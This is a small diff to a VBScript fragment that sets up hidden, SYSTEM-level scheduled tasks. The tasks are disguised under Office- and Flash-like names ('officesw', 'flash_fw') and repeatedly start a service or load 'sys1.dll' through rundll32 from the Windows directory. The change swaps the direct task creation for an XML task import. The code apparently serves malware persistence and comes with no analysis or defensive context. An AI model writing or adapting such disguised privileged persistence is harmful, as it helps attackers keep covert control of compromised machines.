@@ -14,8 +14,9 @@ With CreateObject("WScript.Shell")
     .Run "schtasks /delete /tn officesw /F", 0, True
     'cmd="net start CppWindowsService" 
     'user="SYSTEM"
-    .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
-    .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys1.dll"" /tn flash_fw /rl highest /F", 0, True
+    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
+    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys1.dll"" /tn flash_fw /rl highest /F", 0, True
+    .Run "schtasks /create /tn flash_fw /xml " & windir & "\flash_fw.xml /F", 0, True
 End With
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
